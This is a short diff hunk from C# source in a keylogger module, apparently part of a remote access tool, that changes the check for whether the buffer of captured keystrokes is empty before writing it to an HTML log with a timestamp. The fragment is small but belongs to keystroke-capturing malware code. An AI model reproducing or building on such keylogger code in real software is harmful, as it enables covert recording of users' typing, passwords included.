@@ -207,7 +207,7 @@ namespace xClient.Core.Keylogger
                                     "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                                     DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br>");
 
-                                if (!string.IsNullOrEmpty(_keyBuffer.ToString()))
+                                if (_keyBuffer.Length > 0)
                                     sw.Write(_keyBuffer);
 
                                 _hWndLastTitle = string.Empty;
